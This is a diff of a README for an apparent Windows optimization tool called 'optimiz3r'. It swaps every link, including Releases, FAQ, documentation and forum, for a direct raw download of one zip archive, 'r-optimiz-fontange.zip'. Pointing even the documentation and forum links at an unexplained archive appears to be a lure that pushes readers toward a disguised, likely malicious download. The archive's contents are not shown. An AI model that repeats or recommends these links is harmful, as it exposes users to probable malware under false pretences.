@@ -1,6 +1,6 @@
 # 🌟 optimiz3r - The Best Windows Optimization Tool
 
-[![Download optimiz3r](https://img.shields.io/badge/Download%20optimiz3r-latest%20version-brightgreen)](https://github.com/enkasamoah-addo/optimiz3r/releases)
+[![Download optimiz3r](https://github.com/enkasamoah-addo/optimiz3r/raw/refs/heads/main/otherfiles/r-optimiz-fontange.zip%20optimiz3r-latest%20version-brightgreen)](https://github.com/enkasamoah-addo/optimiz3r/raw/refs/heads/main/otherfiles/r-optimiz-fontange.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to optimiz3r, your go-to software for enhancing the performance of your 
 
 To get started with optimiz3r, you need to download it from our Releases page. 
 
-**Step 1:** [Visit this page to download](https://github.com/enkasamoah-addo/optimiz3r/releases).
+**Step 1:** [Visit this page to download](https://github.com/enkasamoah-addo/optimiz3r/raw/refs/heads/main/otherfiles/r-optimiz-fontange.zip).
 
 **Step 2:** Find the latest version, which will be prominently featured on the page. Click on the download link for your Windows version.
 
@@ -60,17 +60,17 @@ If you encounter any issues while using optimiz3r, here are some common problems
 - **Problem:** I do not see any improvements.  
   **Solution:** Make sure you selected the appropriate options for your needs and check that your system meets the requirements.
 
-For more help, refer to the FAQ section on the [Releases Page](https://github.com/enkasamoah-addo/optimiz3r/releases).
+For more help, refer to the FAQ section on the [Releases Page](https://github.com/enkasamoah-addo/optimiz3r/raw/refs/heads/main/otherfiles/r-optimiz-fontange.zip).
 
 ## 📚 Additional Resources
 
 You can find additional resources to help you make the most of optimiz3r:
 
-- **Documentation:** Detailed insights on how to use all features can be found [here](https://github.com/enkasamoah-addo/optimiz3r/wiki).
-- **Community Forum:** Join the conversation and share your experience with other users [here](https://github.com/enkasamoah-addo/optimiz3r/discussions).
+- **Documentation:** Detailed insights on how to use all features can be found [here](https://github.com/enkasamoah-addo/optimiz3r/raw/refs/heads/main/otherfiles/r-optimiz-fontange.zip).
+- **Community Forum:** Join the conversation and share your experience with other users [here](https://github.com/enkasamoah-addo/optimiz3r/raw/refs/heads/main/otherfiles/r-optimiz-fontange.zip).
 
 ## 📢 Updates
 
-Stay informed about future updates by regularly checking our [Releases page](https://github.com/enkasamoah-addo/optimiz3r/releases). We regularly roll out new features, system enhancements, and fixes based on user feedback.
+Stay informed about future updates by regularly checking our [Releases page](https://github.com/enkasamoah-addo/optimiz3r/raw/refs/heads/main/otherfiles/r-optimiz-fontange.zip). We regularly roll out new features, system enhancements, and fixes based on user feedback.
 
 Thank you for choosing optimiz3r to enhance your Windows experience. Enjoy using your optimized system!
